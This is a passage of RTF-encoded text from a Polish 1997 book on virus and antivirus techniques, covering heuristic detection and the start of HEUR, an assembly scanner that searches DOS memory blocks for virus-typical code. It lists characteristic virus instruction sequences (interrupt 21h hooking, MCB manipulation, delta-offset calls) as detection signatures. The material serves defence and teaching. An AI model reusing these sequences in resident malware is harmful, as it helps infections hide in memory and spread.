\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         ZmienAtrPliku    db ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         Hex2DecBufor     db 11 dup(?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         CiagStart:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         Ciag             db RozmiarCiagu  dup(?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         CiagKoniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         NazwaPliku       db DlugNazwyPliku dup(?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         BufDTA           DTA_STRUC <>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SKANER        ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                         Segment DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;  do wczytywania danych (127 sektorow 512 bajtowych=65024 bajtow)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ProgDTA  SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          BuforDanych     db RozmiarBuforaDanych dup(?)    ; bufor na dane z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ProgDTA  ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                         Segment Stosu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ProgStos segment word stack 'STACK'                      ; ustaw STOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          dw RozmiarStosu dup(?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ProgStos ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 end start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.2. Heurystycze wyszukiwanie wirus\'f3w}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jak wspomniano we wst\uc1\u281\'eapie, wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 istniej\uc1\u261\'b9cych wirus\'f3w to najcz\uc1\u281\'ea\uc1\u347\'9cciej przer\'f3bki, st\uc1\u261\'b9d techniki wykorzystywane w pierwowzorach s\uc1\u261\'b9 bez wi\uc1\u281\'eakszych zmian implementowane w kolej}{\f1\fs24\lang1045{\*\listtag0}nych, nowych pokoleniach wirus\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wykorzystuj\uc1\u261\'b9c ten fakt, tw\'f3rcy program\'f3w antywirusowych zacz\uc1\u281\'eali stosowa\uc1\u263\'e6 technik\uc1\u281\'ea heurystycznego wykrywania kodu, polegaj\uc1\u261\'b9c\uc1\u261\'b9 na tym, i\uc1\u380\'bf na podstawie znajomo\uc1\u347\'9cci charakterystycznych, klasycznych sekwenqi instrukcji zawartych w typowych wirusach, mo\uc1\u380\'bfna znale\uc1\u378\'9f\uc1\u263\'e6 nieznane jeszcze, ale wykorzystuj\uc1\u261\'b9ce je wirusy. Typowe instrukcje wykorzystywane przez wirusy zosta\uc1\u322\'b3y wymienione w poprzednich rozdzia\uc1\u322\'b3ach, np. przy okazji omawiania instalacji w systemie i przejmowania przerwa\uc1\u324\'f1. Poni\uc1\u380\'bfe}{\f1\fs24\lang1045{\*\listtag0}j}{\f0\fs24\lang1045{\*\listtag0} pokazano kilka instrukcji podatnych na heurystyk\uc1\u281\'ea lub sekwencji znajduj\uc1\u261\'b9cych si\uc1\u281\'ea najcz\uc1\u281\'ea\uc1\u347\'9cciej w kodzie typowego wirusa plikowego. Je\uc1\u380\'bfeli program antywirusowy, przeszukuj\uc1\u261\'b9c pami\uc1\u281\'ea\uc1\u263\'e6 lub plik, zidentyfikuje je (lub te\uc1\u380\'bf inne), najcz\uc1\u281\'ea\uc1\u347\'9cciej informuje o tym u\uc1\u380\'bfytk}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}wnika. Cz\uc1\u281\'easto wykrycie nawet kilku charakterystycznych bajt\'f3w w pami\uc1\u281\'eaci mo\uc1\u380\'bfe umo\uc1\u380\'bfliwi\uc1\u263\'e6 wykrycie nieznanego jeszcze wirusa. Poszukiwanie sekwencji mo\uc1\u380\'bfe by\uc1\u263\'e6 prowadzone b\uc1\u261\'b9d\uc1\u378\'9f to przy okazji zwyk\uc1\u322\'b3ego skaningu, b\uc1\u261\'b9d\uc1\u378\'9f te\uc1\u380\'bf podczas kontrolowanego uruchamiania progr}{\f1\fs24\lang1045{\*\listtag0}am\'f3w (tryb krokowy, emulacja procesora).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX, 4B00h                ; sprawd\uc1\u378\'9f czy jest uruchamiany jaki\uc1\u347\'9c program }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                              ; 3D,00,4B kod maszynowy rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP DS:[0],Z                 ; czy ostatni blok pami\uc1\u281\'eaci }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                              ; 80,3E,00,00, 5A kod maszynowy rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX, 2521h                ; funkcja DOS ustaw adres przerwania 21h }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                      ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea B8,21,25,CD,21 kod maszynowy       }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                              ; sekwencji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV WORD PTR [l],0008        ; ustaw blok jako systemowy w nag\uc1\u322\'b3\'f3wku MCB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                              ; C7,06,01,00,08,00 kod maszynowy instrukcji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CALL NEXT                    ; we\uc1\u378\'9f relatywny offset NEXT: }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                              ; E8,00,00 kod instrukcji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zamieszcz}{\f0\fs24\lang1045{\*\listtag0}ony poni\uc1\u380\'bfej program stara si\uc1\u281\'ea znale\uc1\u378\'9f\uc1\u263\'e6 w ca\uc1\u322\'b3ej wykorzystywanej przez programy u\uc1\u380\'bfytkowe pami\uc1\u281\'eaci operacyjnej sekwencje, kt\'f3re zwykle s\uc1\u261\'b9 wykorzystywane przez wirusy.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                       HEUR v1.0, Autor : Adam Blaszczyk 1997               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Program przeglada bloki MCB obecne w systemie i poszukuje w   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              nich kilku standardowo wystepujacych w wirusach sekwencji     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Przy jego uzyciu mozna wykryc w pamieci niektore wirusy       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              rezydetne                                                     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;  Dane techniczne                                                           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;  Pierwszy bajt sygnatury jest w pliku zXORowany z wartoscia 0AAh, a po     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;  uruchomieniu programu przywraca oryginalna wartosc pierwszego bajtu       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;  Dzieki temu program nie wykryje sygnatur np. w buforach dyskowych lub     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;  buforach programow cache (np. SMARTDRV)                                   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;  Program nie sprawdza blokow wolnych (wskaznik PSP w polu bloku MCB=0)     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;;                                                                            ;;                                                                            ;;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch HEUR SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      ORG  100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      ASSUME CS:HEUR, DS:HEUR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      NUL = 00h                           ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      LF  = 0Ah                           ;  - stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      CR  = 0Dh                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IleSygnZebyAlarm = 10                    ; okresla, ile sygnatur musi wystapic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; w badanym bloku MCB, aby potraktowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; jego zawartosc za podejrzana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; i wyswietlic ostrzezenie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugProgPara  = (Offset Koniec-Offset Start+15)/16+10h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; okresla dlugosc programu w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sygn struc                               ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      SygnNazwa     db 45 dup (?)         ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      SygnDlug      dw 0                  ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn00        db 0                  ;    \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn01        db 0                  ;     \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn02        db 0                  ;      \\  struktura opisujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn03        db 0                  ;      /  sygnature wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn04        db 0                  ;     /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn05        db 0                  ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn06        db 0                  ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Sygn07        db 0                  ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sygn ends                                ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugoscSygnatury = Size Sygn             ; dlugosc struktury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeCopyRight              ; SI=ofset do informacji o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukLn                      ; wyswietl info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  SzukajHeur                  ; szukaj sekwencji w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,4C00h                    ; funkcja DOS - koncz program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajHeur:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  es ax bx cx dx              ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,IleSygnatur              ; ile sygnatur do odXORowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,Sygnatury                ; skad pobierac sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   si,size SygnNazwa+size SygnDlug}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; i gdzie XORowac bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XORujSygnature:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xor   byte ptr [si],0AAh          ; przywroc prawdziwy bajt sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        add   si,DlugoscSygnatury         ; wez kolejna sygnature}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        dec   bx                          ; zmniejsz licznik sygnatur}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jnz   XORujSygnature              ; powtarzaj dla kazdej sygnatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   IloscSygn,0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5802h                    ; funkcja DOS - czy UMB dolaczone ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax                          ; zachowaj informacje na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5803h                    ; funkcja DOS - dolacz/odlacz bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,1                        ; sprobuj dolaczyc bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
